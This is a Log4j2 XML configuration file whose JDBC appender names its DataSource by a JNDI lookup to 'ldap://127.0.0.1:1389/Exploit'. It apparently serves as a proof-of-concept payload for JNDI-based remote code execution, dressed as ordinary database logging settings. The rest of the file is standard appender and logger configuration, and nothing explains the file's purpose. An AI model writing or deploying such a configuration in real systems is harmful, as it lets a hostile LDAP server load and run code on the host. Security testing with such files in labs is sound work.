<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="error">
    <Appenders>
        <JDBC name="databaseAppender" tableName="dbo.application_log">
            <DataSource jndiName="ldap://127.0.0.1:1389/Exploit" />
            <Column name="eventDate" isEventTimestamp="true" />
            <Column name="level" pattern="%level" />
            <Column name="logger" pattern="%logger" />
            <Column name="message" pattern="%message" />
            <Column name="exception" pattern="%ex{full}" />
        </JDBC>
    </Appenders>
    <Loggers>
        <Root level="warn">
            <AppenderRef ref="databaseAppender"/>
        </Root>
    </Loggers>
</Configuration>

